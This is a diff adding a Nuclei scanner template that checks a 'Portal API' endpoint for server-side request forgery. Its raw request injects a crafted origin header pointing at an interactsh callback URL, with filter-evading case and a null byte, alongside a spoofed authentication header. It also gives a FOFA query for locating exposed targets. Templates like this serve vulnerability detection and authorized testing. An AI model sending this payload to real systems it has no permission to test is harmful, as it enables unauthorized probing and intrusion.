@@ -1,0 +1,38 @@
+id: portal-api-ssrf
+
+info:
+  name: Portal API - Server Side Request Forgery
+  author: ishowtess
+  severity: high
+  description: |
+    A Server-Side Request Forgery (SSRF) vulnerability in the Portal API endpoint by injecting a crafted X-Portal-Context-Origin header.
+  reference:
+    - https://owasp.org/www-community/attacks/Server_Side_Request_Forgery
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: body="/_proxy/api/v3/"
+  tags: ssrf,api,portal,http,vuln
+
+http:
+  - raw:
+      - |
+        GET /_proxy/api/v3/portal HTTP/1.1
+        Host: {{Hostname}}
+        X-Portal-Context-Origin: HttP://{{interactsh-url}}?%00
+        X-Portal-Session-Authenticated: true
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains(interactsh_protocol, "http")'
+          - 'contains(interactsh_request, "/api/v3/portal")'
+        condition: and
+
+    extractors:
+      - type: regex
+        name: interaction_id
+        part: interactsh
+        regex:
+          - "[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}"
+# digest: 4b0a00483046022100bd0b03552ff0caa82550146b4c595634dc169ed5b0242c69a12a2528cee43d10022100ce9198032d78399a1552a1a3aba08ad0c88d2ecf185c2048baee3f2bbac80210:922c64590222798bb761d5b6d8e72950
